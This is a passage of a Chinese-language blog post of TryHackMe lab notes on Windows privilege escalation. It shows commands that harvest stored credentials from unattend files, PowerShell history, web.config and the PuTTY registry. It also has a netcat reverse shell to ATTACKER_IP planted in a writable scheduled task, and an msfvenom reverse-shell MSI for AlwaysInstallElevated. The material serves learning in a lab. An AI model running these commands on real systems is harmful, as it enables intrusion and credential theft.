}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-Windows权限提升</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-02-06T02:17:59.893Z" title="发表于 2024-02-06 10:17:59">2024-02-06</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-02-06T04:29:42.613Z" title="更新于 2024-02-06 12:29:42">2024-02-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">10.6k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>37分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-Windows权限提升"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/02/06/thm-windows-quan-xian-ti-sheng/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/02/06/thm-windows-quan-xian-ti-sheng/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/02/06/thm-windows-quan-xian-ti-sheng/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-Windows权限提升</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-02-06T02:17:59.893Z" title="发表于 2024-02-06 10:17:59">2024-02-06</time><time itemprop="dateCreated datePublished" datetime="2024-02-06T04:29:42.613Z" title="更新于 2024-02-06 12:29:42">2024-02-06</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>最近在tryhackme中学到了Windows渗透相关知识，在此之前学的有些东西忘记记录了，但实际上也没有记录的必要性，故此不管了。这里就记录Windows提权的某些知识点。</p>
<h1 id="0x02-简介">0x02 简介</h1>
<p>简而言之，权限升级包括使用“用户 A”对主机的给定访问权限，并通过滥用目标系统中的弱点来利用它来获得对“用户 B”的访问权限。虽然我们通常希望“用户 B”拥有管理权限，但在某些情况下，我们可能需要升级到其他非特权帐户，然后才能真正获得管理权限。</p>
<p>获得对不同帐户的访问权限就像在一些粗心的用户留下的不安全的文本文件或电子表格中查找凭据一样简单，但情况并非总是如此。根据具体情况，我们可能需要利用以下一些弱点：</p>
<ul>
<li>Windows 服务或计划任务配置错误</li>
<li>分配给我们帐户的权限过多</li>
<li>易受攻击的软件</li>
<li>缺少 Windows 安全补丁</li>
</ul>
<p>在开始讨论实际技术之前，让我们先了解一下 Windows 系统上的不同帐户类型。</p>
<h1 id="0x03-windows用户">0x03 Windows用户</h1>
<p>Windows系统主要有两类用户。根据用户的访问级别，我们可以将用户分为以下组之一：</p>
<table>
<thead>
<tr>
<th><strong>Administrators 管理员</strong></th>
<th>这些用户拥有最多的权限。他们可以更改任何系统配置参数并访问系统中的任何文件。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Standard Users 标准用户</strong></td>
<td>这些用户可以访问计算机，但只能执行有限的任务。通常，这些用户无法对系统进行永久或重要的更改，并且仅限于他们的文件。</td>
</tr>
</tbody>
</table>
<p>任何具有管理权限的用户都将成为管理员组的一部分。另一方面，标准用户是用户组的一部分。</p>
<p>除此之外，您通常会听说操作系统在权限升级的情况下使用一些特殊的内置帐户：</p>
<table>
<thead>
<tr>
<th><strong>SYSTEM / LocalSystem 系统/本地系统</strong></th>
<th>操作系统用来执行内部任务的帐户。它可以完全访问主机上可用的所有文件和资源，并且具有比管理员更高的权限。</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Local Service 本地服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用网络上的匿名连接。</td>
</tr>
<tr>
<td><strong>Network Service 网络服务</strong></td>
<td>用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证。</td>
</tr>
</tbody>
</table>
<p>这些帐户由 Windows 创建和管理，您将无法像其他常规帐户一样使用它们。不过，在某些情况下，您可能会因为利用特定服务而获得他们的特权。</p>
<h1 id="0x03-windows密码收集">0x03 Windows密码收集</h1>
<p>获得其他用户访问权限的最简单方法是从受感染的计算机收集凭据。此类凭证的存在可能有多种原因，包括粗心的用户将其留在明文文件中；甚至由浏览器或电子邮件客户端等软件存储。</p>
<h2 id="31-windows-installations">3.1 Windows installations</h2>
<p>在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多台主机。此类安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户来执行初始设置，该设置最终可能存储在计算机中的以下位置：</p>
<ul>
<li>C:\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
</ul>
<p>作为这些文件的一部分，您可能会遇到凭据：</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Credentials</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span>Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Username</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Domain</span>&gt;</span>thm.local<span class="hljs-tag">&lt;/<span class="hljs-name">Domain</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>MyPassword123<span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Credentials</span>&gt;</span></code></pre>
<h2 id="32-powershell-history">3.2 Powershell History</h2>
<p>每当用户使用 Powershell 运行命令时，它都会存储到一个文件中，该文件会保留过去的命令。这对于快速重复之前使用过的命令很有用。如果用户直接在 Powershell 命令行中运行包含密码的命令，则稍后可以在 <code>cmd.exe</code> 提示符下使用以下命令来检索该密码：</p>
<pre><code class="hljs scss">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history<span class="hljs-selector-class">.txt</span></code></pre>
<p>注意：上面的命令只能在 cmd.exe 中运行，因为 Powershell 不会将 <code>%userprofile%</code> 识别为环境变量。要从 Powershell 读取文件，您必须将 <code>%userprofile%</code> 替换为 <code>$Env:userprofile</code> 。</p>
<h2 id="33-windows-credentials">3.3 Windows Credentials</h2>
<p>Windows 允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。下面的命令将列出保存的凭据：</p>
<pre><code class="hljs scss">cmdkey /list</code></pre>
<p>虽然您看不到实际的密码，但如果您发现任何值得尝试的凭据，则可以将它们与 <code>runas</code> 命令和 <code>/savecred</code> 选项一起使用，如下所示。</p>
<pre><code class="hljs scss">runas /savecred /user:admin cmd.exe
//上述的user:admin可分别用对应的hash值替换</code></pre>
<h2 id="34-iis-configuration">3.4 IIS Configuration</h2>
<p>Internet 信息服务 (IIS) 是 Windows 安装上的默认 Web 服务器。 IIS 上网站的配置存储在名为 <code>web.config</code> 的文件中，并且可以存储数据库的密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：</p>
<ul>
<li>C:\inetpub\wwwroot\web.config</li>
<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li>
</ul>
<p>这是在文件上查找数据库连接字符串的快速方法：</p>
<pre><code class="hljs scss">type C:\Windows\Microsoft.NET\Framework64\v4.<span class="hljs-number">0.30319</span>\Config\web.config | findstr connectionString</code></pre>
<h2 id="35-从软件检索凭证putty">3.5 从软件检索凭证：PuTTY</h2>
<p>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户不必每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供以后使用。虽然 PuTTY 不允许用户存储其 SSH 密码，但它将存储包含明文身份验证凭据的代理配置。</p>
<p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p>
<pre><code class="hljs scss">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s</code></pre>
<p>注意：Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</p>
<p>正如 putty 存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP 客户端、SSH 客户端、VNC 软件等，都将有方法恢复用户保存的任何密码。</p>
<h1 id="0x04-权限提升">0x04 权限提升</h1>
<h2 id="41-scheduled-tasks-计划任务">4.1 Scheduled Tasks -计划任务</h2>
<p>查看目标系统上的计划任务，您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件。</p>
<p>可以使用不带任何选项的 <code>schtasks</code> 命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令：</p>
<p>可以使用不带任何选项的 <code>schtasks</code> 命令从命令行列出计划任务。要检索有关任何服务的详细信息，您可以使用如下命令：</p>
<pre><code class="hljs scss">C:\&gt; schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1</code></pre>
<p>您将获得有关该任务的大量信息，但对我们来说重要的是“Task To Run”参数，该参数指示计划任务执行的内容，以及“Run As User”参数，该参数显示将使用的用户执行任务。</p>
<p>如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的文件权限，我们使用 <code>icacls</code> ：</p>
<pre><code class="hljs scss">C:\&gt; icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)</code></pre>
<p>从结果中可以看出，BUILTIN\Users 组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入我们喜欢的任何有效负载。为了您的方便，可以在 <code>C:\tools</code> 上找到 <code>nc64.exe</code> 。让我们更改 bat 文件以生成反向 shell：</p>
<pre><code class="hljs scss">C:\&gt; echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP <span class="hljs-number">4444</span> &gt; C:\tasks\schtask.bat</code></pre>
<p>然后，我们在攻击者机器上启动一个侦听器，该侦听器位于我们在反向 shell 上指示的同一端口上：</p>
<pre><code class="hljs scss">nc -lvp <span class="hljs-number">4444</span></code></pre>
<p>下次运行计划任务时，您应该会收到具有taskusr1权限的反向shell。虽然您可能无法在实际场景中启动任务，而必须等待计划任务触发（但我们为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行该任务）</p>
<pre><code class="hljs scss">C:\&gt; schtasks /run /tn vulntask</code></pre>
<p>您将按预期收到具有taskusr1权限的反向shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4444</span>
Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4444</span>
Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">50649</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami
wprivesc1\taskusr1</code></pre>
<h2 id="42-alwaysinstallelevated-始终安装提升">4.2 AlwaysInstallElevated -始终安装提升</h2>
<p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，可以将它们配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能会让我们生成一个以管理员权限运行的恶意 MSI 文件。</p>
<p>注意：AlwaysInstallElevated 方法在此房间的计算机上不起作用，它仅供参考。</p>
<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。</p>
<pre><code class="hljs scss">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></pre>
<p>为了能够利用此漏洞，两者都应该设置。否则，利用将是不可能的。如果设置了这些，您可以使用 <code>msfvenom</code> 生成恶意 .msi 文件，如下所示：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious<span class="hljs-selector-class">.msi</span></code></pre>
<p>由于这是一个反向 shell，您还应该运行相应配置的 Metasploit 处理程序模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p>
<pre><code class="hljs scss">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</code></pre>
<h2 id="43-windows-services">4.3 Windows Services</h2>
<p>Windows 服务由服务控制管理器 (SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。</p>
<p>Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件实现特殊功能以便能够与 SCM 通信，因此任何可执行文件都不能作为服务成功启动。每个服务还指定该服务将在其下运行的用户帐户。</p>
<p>为了更好地理解服务的结构，让我们使用 <code>sc qc</code> 命令检查 apphostsvc 服务配置：</p>
<pre><code class="hljs scss">C:\&gt; sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : <span class="hljs-number">20</span>  WIN32_SHARE_PROCESS
        START_TYPE         : <span class="hljs-number">2</span>   AUTO_START
        ERROR_CONTROL      : <span class="hljs-number">1</span>   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : <span class="hljs-number">0</span>
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem</code></pre>
<p>在这里我们可以看到关联的可执行文件是通过 BINARY_PATH_NAME 参数指定的，用于运行服务的帐户显示在 SERVICE_START_NAME 参数上。</p>
<p>服务有一个自主访问控制列表（DACL），它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他权限。 DACL 可以从 Process Hacker 中看到（可以在您的计算机桌面上找到）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240206103905671.png" alt="image-20240206103905671"></p>
<p>所有服务配置都存储在注册表中的 <code>HKLM\SYSTEM\CurrentControlSet\Services\</code> 下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206103915222.png" alt="image-20240206103915222"></p>
<p>系统中的每个服务都存在一个子项。同样，我们可以在 ImagePath 值上看到关联的可执行文件，并在 ObjectName 值上看到用于启动服务的帐户。如果已为该服务配置了 DACL，它将存储在名为 Security 的子项中。正如您现在已经猜到的，默认情况下只有管理员可以修改此类注册表项。</p>
<h2 id="44-服务可执行文件的不安全权限">4.4 服务可执行文件的不安全权限</h2>
<p>如果与服务关联的可执行文件的权限较弱，允许攻击者修改或替换它，则攻击者可以轻松获得该服务帐户的权限。</p>
<p>为了了解其工作原理，让我们看一下 Splinterware System Scheduler 上发现的漏洞。首先，我们将使用 <code>sc</code> 查询服务配置：</p>
